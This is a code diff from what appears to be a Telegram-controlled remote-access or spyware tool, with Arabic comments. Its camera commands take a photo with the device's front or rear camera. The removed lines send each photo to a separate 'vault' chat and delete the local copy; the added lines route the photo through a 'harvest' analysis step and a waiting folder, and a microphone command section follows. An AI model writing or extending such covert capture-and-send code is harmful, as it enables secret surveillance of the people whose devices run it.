@@ -233,21 +233,16 @@ class C:
                             "reply_markup": json.dumps({"inline_keyboard": confirm_kb})})
                 return
 
-            # ---------- الكاميرا ----------
+            # ---------- الكاميرا (باستخدام harvest للتحليل التلقائي) ----------
             if cmd.startswith(("cam_", "camf_")):
                 is_front = 1 if "camf_" in cmd else 0
                 if not self._battery_ok(m):
                     tg._api("sendMessage", {"chat_id": cid, "text": "🔋 البطارية منخفضة جداً (أقل من 15%)"})
                     return
                 tg._api("sendChatAction", {"chat_id": cid, "action": "upload_photo"})
-                pic_path = m.camera_analyzer.capture(cam_id=is_front)
-                if pic_path and os.path.exists(pic_path):
-                    with open(pic_path, 'rb') as f:
-                        target = getattr(m, 'vlt', cid)
-                        tg._api("sendPhoto", {"chat_id": target, "caption": f"📸 {m.dmd}"}, {"photo": f})
-                    os.remove(pic_path)
-                else:
-                    tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل التقاط الصورة"})
+                # استدعاء harvest بدلاً من capture للتحليل والإشعار والنقل إلى مجلد الانتظار
+                m.camera_analyzer.harvest(cam_id=is_front)
+                tg._api("sendMessage", {"chat_id": cid, "text": "📸 تم التقاط الصورة وتحليلها. سيتم إرسال النتائج لاحقاً."})
                 return
 
             # ---------- الميكروفون ----------
